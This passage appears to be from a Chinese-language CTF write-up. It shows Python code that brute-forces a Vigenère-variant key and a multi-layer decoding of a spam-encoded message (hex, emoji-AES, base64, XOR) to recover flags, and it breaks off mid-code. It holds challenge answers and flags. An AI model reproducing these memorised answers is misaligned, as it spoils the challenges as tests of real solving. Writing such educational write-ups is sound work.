function">decrypt_vigenere_variant</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    key_index <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    key_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    text_index <span class="token operator">=</span> key_index</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">for</span> char <span class="token keyword">in</span> plaintext<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">if</span> key<span class="token punctuation">[</span>key_index <span class="token operator">%</span> key_length<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'?'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                key_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                text_index <span class="token operator">+=</span> <span class="token number">1</span> </pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            key_char <span class="token operator">=</span> key<span class="token punctuation">[</span>key_index <span class="token operator">%</span> key_length<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            key_offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key_char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">if</span> char<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>text_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                <span class="token keyword">for</span> ori <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                    <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>ori <span class="token operator">+</span> text_index <span class="token operator">*</span> key_offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> base<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ori<span class="token operator">+</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="42"></td><td><pre>                <span class="token keyword">for</span> ori <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                    <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>ori <span class="token operator">-</span> text_index <span class="token operator">*</span> key_offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> base<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ori<span class="token operator">+</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>            <span class="token comment"># ciphertext += encrypted_char</span></pre></td></tr><tr><td data-num="53"></td><td><pre>            key_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="54"></td><td><pre>            text_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>length <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="63"></td><td><pre>       <span class="token punctuation">[</span><span class="token string">'O'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="64"></td><td><pre>       <span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="65"></td><td><pre>       <span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="66"></td><td><pre>       <span class="token punctuation">[</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="67"></td><td><pre>       <span class="token punctuation">[</span><span class="token string">'O'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="68"></td><td><pre>       <span class="token punctuation">[</span><span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="69"></td><td><pre>random_key_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="70"></td><td><pre>random_key <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token keyword">def</span> <span class="token function">try_idx</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">global</span> random_key<span class="token punctuation">,</span> random_key_arr</pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>random_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        decrypt_vigenere_variant<span class="token punctuation">(</span>recv<span class="token punctuation">,</span> random_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token comment"># print(f'&#123;decrypted&#125;')</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n------------'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>        <span class="token keyword">return</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        random_key_arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        random_key <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random_key_arr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        try_idx<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        random_key_arr<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>random_key_arr<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token comment"># print(random_key)</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre>lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="90"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"len(key)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>    mod <span class="token operator">=</span> start <span class="token operator">%</span> i</pre></td></tr><tr><td data-num="92"></td><td><pre>    old_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mod<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="94"></td><td><pre>        arr<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'?'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> i<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="96"></td><td><pre>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'?'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="98"></td><td><pre>        try_idx<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>    arr<span class="token operator">=</span>old_arr</pre></td></tr></table></figure><p>运行后的输出比较长，需要人工筛选出合理的，即在里面找到一篇文章，已完全解密的单词都是合法的单词</p><p>可以发现，密钥长度为 13 时，大多数已解密的单词都是合法的</p><p>密钥为 <code>??KOWJHOG????</code> 时解密效果最好，结果为：</p><figure class="highlight plain"><figcaption data-lang="plain"></figcaption><table><tr><td data-num="1"></td><td><pre>??ilx! In vi??, ? ???ble vaud??????an veter??, ???? vicario???? ?? both vic??? ??? villain ?? ??? ?icissit???? ?? Fate. Thi? ?????e, no mere ?????? of Vanit?, ?? ?? ?estige o? ??? ??x populi, ??? ???ant, Vani????, ?? the once ????? ?oice of t?? ????similit??? ??? Venerat?? ???? they onc? ?????ied. Howe???, ???s Valoro?? ????tation o? ? ??-??ne Vexat???, ???nds Vivi????, ??d has Vow?? ?? ??nquish t???? ??nal and V??????t Vermin ??????rd-ing Vi?? ??? ?ouchsaf??? ??? Violent?? ????ous and V??????us Viola???? ?? Volitio?. ?????t this Vo???? ?? Verbosi??, ? ???led Vest??? ?? ?indicat??? ???rges: a Va?????? W4terCTF&#123;??????H_Th3_mASk_???3?3??_5TRlK3S_84Ck_????_?3?934nc3&#125;, yet Vi??????s Vector ??? ???tory. The ???? ??rdict is ??????nce; a Ven?????, ?eld as a V?????, ?ot in Vai?, ??? ??e Value a?? ????city of s??? ???ll one da? ?????cate the ??????nt and th? ?????ous. Veri??, ???? Vichyss???? ?? Verbiag? ????? most Ver????, ??t within ??? ???umes lie? ??? ??brant Vo??? ?? ?alidati??. ?? ??is Vein, i? ?? ?? ?ery good ????? ?o meet yo? ??? ??u may cal? ?? ?.</pre></td></tr></table></figure><p>可以大胆猜测，其中的 <code>Howe???, ???s</code> 原文是 However, this，重复上面的操作，尝试逆推出密钥的另一部分</p><p>以下可以复用上面的代码，可以推测更长的密钥片段：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'O'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'O'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre> <span class="token punctuation">[</span><span class="token string">'G'</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">]</span></pre></td></tr></table></figure><p>然后用更长的密钥片段尝试解密原文，筛选出其中有效的如下</p><p>密钥为 <code>??KOWJHOGWPG?</code></p><figure class="highlight plain"><figcaption data-lang="plain"></figcaption><table><tr><td data-num="1"></td><td><pre>??ilx! In view, a ???ble vaudevi???an veteran, c??? vicariousl? ?? both victim ??? villain by t?? ?icissitude? ?? Fate. This Vi???e, no mere Ven??? of Vanity, is ?? ?estige of th? ??x populi, now ???ant, Vanishe?, ?? the once Vit?? ?oice of the V???similitude ??? Venerates w??? they once Vi???ied. However, ???s Valorous V???tation of a b?-??ne Vexation, ???nds Vivifie?, ??d has Vowed t? ??nquish thes? ??nal and Viru???t Vermin van???rd-ing Vice a?? ?ouchsafing ??? Violently V???ous and Vora???us Violatio? ?? Volition. Am???t this Vorte? ?? Verbosity, a ???led Vestige ?? ?indication ???rges: a Varia??? W4terCTF&#123;bEn???H_Th3_mASk_vIG3?3??_5TRlK3S_84Ck_WiT?_?3?934nc3&#125;, yet Vivac???s Vector for ???tory. The onl? ??rdict is Ven???nce; a Vendet??, ?eld as a Voti??, ?ot in Vain, fo? ??e Value and V???city of such ???ll one day Vi???cate the Vig???nt and the Vi???ous. Verily, t??? Vichyssois? ?? Verbiage Ve??? most Verbos?, ??t within its ???umes lies th? ??brant Voice ?? ?alidation. I? ??is Vein, it is ?? ?ery good hon?? ?o meet you an? ??u may call me ?.</pre></td></tr></table></figure><p>继续重复上面的操作 1-2 次，得到真正的密钥和原文</p><p>密钥 <code>BYKOWJHOGWPGG</code></p><figure class="highlight plain"><figcaption data-lang="plain"></figcaption><table><tr><td data-num="1"></td><td><pre>Voilx! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate. This Visage, no mere Veneer of Vanity, is it Vestige of the Vox populi, now Vacant, Vanished, as the once Vital Voice of the Verisimilitude now Venerates what they once Vilified. However, this Valorous Visitation of a by-gone Vexation, stands Vivified, and has Vowed to Vanquish these Venal and Virulent Vermin vanguard-ing Vice and Vouchsafing the Violently Vicious and Voracious Violation of Volition. Amidst this Vortex of Verbosity, a Veiled Vestige of Vindication emerges: a Variable W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;, yet Vivacious Vector for Victory. The only Verdict is Vengeance; a Vendetta, held as a Votive, not in Vain, for the Value and Veracity of such shall one day Vindicate the Vigilant and the Virtuous. Verily, this Vichyssoise of Verbiage Veers most Verbose, yet within its Volumes lies the Vibrant Voice of Validation. In this Vein, it is my Very good honor to meet you and you may call me V.</pre></td></tr></table></figure><p>拿到 flag</p><p><code>W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;</code></p><h2 id="spam-2024"><a class="anchor" href="#spam-2024">#</a> Spam 2024</h2><p>下载得到一篇很长的垃圾邮件</p><p>参考资料：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5ydHNlYy5jbi9kLzExNi1nb25nLWZhbmctc2hpLWppZS1jcnlwdG8tamktY2h1LXRpLW11LWNyeXB0b2xhLWppLXlvdS1qaWFu">https://forum.rtsec.cn/d/116-gong-fang-shi-jie-crypto-ji-chu-ti-mu-cryptola-ji-you-jian</span></p><p>使用 https://www.spammimic.com/，Decode 正文部分，得到</p><pre><code>59,6f,75,20,6c,69,6b,65,20,65,6d,6f,6a,69,73,2c,20,64,6f,6e,27,74,20,79,6f,75,3f,0a,0a,01f643,01f4b5,01f33f,01f3a4,01f6aa,01f30f,01f40e,01f94b,01f6ab,01f606,2705,01f606,01f6b0,01f4c2,01f32a,263a,01f6e9,01f30f,01f4c2,01f579,01f993,01f405,01f375,01f388,01f600,01f504,01f6ab,01f3a4,01f993,2705,01f4ee,01f3a4,01f385,01f34e,01f643,01f309,01f383,01f34d,01f374,01f463,01f6b9,01f923,01f418,01f3f9,263a,01f463,01f4a7,01f463,01f993,01f33f,2328,01f32a,01f30f,01f643,01f375,2753,2602,01f309,01f606,01f3f9,01f375,01f4a7,01f385,01f449,01f30a,01f6b9,01f6aa,01f374,01f60e,01f383,01f32a,01f643,01f441,01f94b,01f451,01f4a7,01f418,01f3a4,01f94b,01f418,01f6e9,01f923,01f309,01f6e9,23e9,01f60d,2753,01f418,01f621,2600,01f60d,01f643,01f601,01f600,01f601,01f6ab,01f4c2,2705,2603,01f6ab,01f60e,01f52a,01f451,01f600,01f579,01f6ab,01f60d,01f32a,01f4c2,01f44c,01f34d,01f44c,01f993,01f590,01f923,01f60e,01f3ce,01f34d,01f3f9,01f34c,01f34d,01f3a4,2600,01f3f9,01f388,01f6b0,01f4a7,2600,2709,01f3f9,01f34d,01f993,01f385,01f374,2602,23e9,01f6aa,01f40d,263a,01f418,01f607,01f621,01f375,01f30f,01f993,01f375,01f6e9,01f4c2,01f44c,01f3f9,01f5d2,01f5d2,0a,0a,42,74,77,2c,20,74,68,65,20,6b,65,79,20,69,73,20,22,4b,45,59,22
</code></pre><p>From HEX</p><pre><code>You like emojis, don't you?
(乱码)
Btw, the key is &quot;KEY&quot;
</code></pre><p>逗号换成 \u</p><pre><code>\u59\u6f\u75\u20\u6c\u69\u6b\u65\u20\u65\u6d\u6f\u6a\u69\u73\u2c\u20\u64\u6f\u6e\u27\u74\u20\u79\u6f\u75\u3f\u0a\u0a\u01f643\u01f4b5\u01f33f\u01f3a4\u01f6aa\u01f30f\u01f40e\u01f94b\u01f6ab\u01f606\u2705\u01f606\u01f6b0\u01f4c2\u01f32a\u263a\u01f6e9\u01f30f\u01f4c2\u01f579\u01f993\u01f405\u01f375\u01f388\u01f600\u01f504\u01f6ab\u01f3a4\u01f993\u2705\u01f4ee\u01f3a4\u01f385\u01f34e\u01f643\u01f309\u01f383\u01f34d\u01f374\u01f463\u01f6b9\u01f923\u01f418\u01f3f9\u263a\u01f463\u01f4a7\u01f463\u01f993\u01f33f\u2328\u01f32a\u01f30f\u01f643\u01f375\u2753\u2602\u01f309\u01f606\u01f3f9\u01f375\u01f4a7\u01f385\u01f449\u01f30a\u01f6b9\u01f6aa\u01f374\u01f60e\u01f383\u01f32a\u01f643\u01f441\u01f94b\u01f451\u01f4a7\u01f418\u01f3a4\u01f94b\u01f418\u01f6e9\u01f923\u01f309\u01f6e9\u23e9\u01f60d\u2753\u01f418\u01f621\u2600\u01f60d\u01f643\u01f601\u01f600\u01f601\u01f6ab\u01f4c2\u2705\u2603\u01f6ab\u01f60e\u01f52a\u01f451\u01f600\u01f579\u01f6ab\u01f60d\u01f32a\u01f4c2\u01f44c\u01f34d\u01f44c\u01f993\u01f590\u01f923\u01f60e\u01f3ce\u01f34d\u01f3f9\u01f34c\u01f34d\u01f3a4\u2600\u01f3f9\u01f388\u01f6b0\u01f4a7\u2600\u2709\u01f3f9\u01f34d\u01f993\u01f385\u01f374\u2602\u23e9\u01f6aa\u01f40d\u263a\u01f418\u01f607\u01f621\u01f375\u01f30f\u01f993\u01f375\u01f6e9\u01f4c2\u01f44c\u01f3f9\u01f5d2\u01f5d2\u0a\u0a\u42\u74\u77\u2c\u20\u74\u68\u65\u20\u6b\u65\u79\u20\u69\u73\u20\u22\u4b\u45\u59\u22
</code></pre><p>把这个放到 https://www.ifreesite.com/unicode/，得到</p><pre><code>You like emojis, don't you?

🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒

Btw, the key is &quot;KEY&quot;
</code></pre><p>使用 https://aghorler.github.io/emoji-aes/</p><p>key = 🔑, 得到</p><pre><code>0x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=
</code></pre><p>进行 base64 解码</p><p><img data-src="https://s2.loli.net/2024/04/29/NcwrtAGylDIOVU9.png" alt="spam2024"></p><p>做异或操作，可以猜测开头就是 <code>W4</code></p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s <span class="token operator">=</span> <span class="token comment"># base64 解码后的数据</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> s<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    h <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'W'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    l <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span 